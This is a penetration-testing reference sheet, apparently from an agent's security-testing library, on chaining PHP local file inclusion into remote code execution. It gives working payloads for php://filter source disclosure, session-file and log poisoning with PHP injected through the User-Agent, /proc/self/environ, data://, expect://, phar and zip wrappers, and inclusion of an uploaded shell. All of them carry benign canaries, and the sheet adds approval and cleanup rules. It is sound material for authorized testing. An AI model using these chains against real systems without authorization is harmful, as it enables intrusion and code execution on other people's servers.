---
name: lfi_rce_chains
description: LFI to RCE chains (CWE-98) (from rce_fast_path_verification specialist
  reference library)
---

# LFI to RCE chains (CWE-98)

Wrapper/chain list with preconditions and risk notes. Canary content is the
benign form; every chain that writes anything is paired with cleanup.

## 1. Prerequisite confirmation

Before any chain: confirm plain LFI with a read of a deterministic file
(`/etc/hostname`, `/etc/passwd` existence — do not copy user data out; note
readability and stop). Record the include base path (relative/absolute
behavior, null-byte sensitivity, filter behavior).

## 2. Source-disclosure chain (read first, always)

- `?file=php://filter/convert.base64-encode/resource=index.php` — base64 of
  the executed source decodes offline. Use it to map: upload paths, session
  save path (`session.save_path`), `allow_url_include`, log file paths.
- `php://filter/convert.base64-encode/resource=.htaccess` / config files:
  secrets found (DB passwords, keys) are recorded REDACTED in evidence and
  never exfiltrated — the finding is "source disclosure", not data access.
- Wrapper variants: `convert.iconv.UTF-8.UTF-7` chains are documented in the
  wild (filter-chain RCE); treat as `75-zeroday-research` territory — novel
  chain, operator approval first.

## 3. Session-file inclusion

Preconditions: session values you control are persisted server-side
(e.g. `$_SESSION['lang'] = $_GET['lang']`); session save path known
(default `/var/lib/php/sessions/` or `/tmp/`; confirm via filter reads or
`phpinfo` exposure from `50`).

Chain:

1. Set the controlled session value to canary content:
   `?lang=<?php echo "rj-pt-<eng>-<nonce>"; ?>` (URL-encoded).
2. Include the session file: `?file=/var/lib/php/sessions/sess_<PHPSESSID>`.
3. Canary echo = proof. Cleanup: re-visit the page with a fresh value or let
   the session expire; note the session id used.

## 4. Log poisoning

Preconditions: readable log path through the LFI; controlled input lands
VERBATIM in the log (User-Agent in access.log is classic); the include
executes PHP found in the file.

Chain:

1. Confirm read: `?file=/var/log/apache2/access.log` (or nginx
   `/var/log/nginx/access.log`, ssh `/var/log/auth.log` — caution).
2. Send one request whose User-Agent is exactly the canary content
   (`User-Agent: <?php echo "rj-pt-..."; ?>`).
3. Include the log file; canary echo = proof.

Caution (binding):

- One poison line, one include probe — do not spam logs.
- Shared-hosting logs contain other tenants' data: if the log read shows
  third-party content, stop and record an observation instead.
- Requires operator approval before poisoning production logs.
- Cleanup: log lines cannot be deleted remotely — the cleanup confirmation is
  the scrub/rotate request handed to the blue team at debrief (`85`).

## 5. /proc chains (scope caution)

- `/proc/self/environ`: reflects request headers on legacy CGI/mod_php
  setups. CAUTION: environ can contain real secrets — test ONLY with a
  controlled canary header (`X-Canary: <?php echo ... ?>`) and stop at the
  proof; do not dump the whole file.
- `/proc/self/fd/N`: open file descriptors may alias the access log or an
  uploaded temp file; enumerate serially, small N range, stop at proof.
- `/proc/self/cmdline`: reveals the interpreter invocation (php flags) with
  no execution risk — useful before choosing later chains.

## 6. Remote/wrapper inclusions

| Wrapper | Preconditions | Proof form |
|---|---|---|
| `http://` / `https://` (RFI) | `allow_url_include=On` (confirm via filter/phpinfo) | include engagement-controlled URL on the `20` listener serving canary PHP |
| `data://text/plain;base64,...` | `allow_url_include=On` | inline base64 canary content |
| `expect://id` | expect wrapper compiled in (rare) | benign `id` output |
| `phar://uploads/x.png/file.txt` | uploaded phar + phar stream consumer | metadata gadget — pairs with `references/deserialization-chains.md` |
| `zip://uploads/x.zip#shell.rjpt` | zip upload accepted + zip wrapper | canary content member |

## 7. Chain pairing with uploads

If the upload bypass (`references/upload-bypass.md`) stored content but the
web server won't execute it, an LFI include of the stored path may still
execute it (`?file=/uploads/shell.rjpt` with or without `.htaccess` help) —
upload and LFI findings chain; record both artifacts and clean both.

## 8. Cleanup checklist per chain

- Session chain: overwrite the poisoned session value or discard session.
- Log chain: no remote deletion possible — scrub request to blue team.
- Upload/zip artifacts: delete + 404 re-check.
- Wrapper/RFI: remove the engagement-side canary file from the `20` listener.

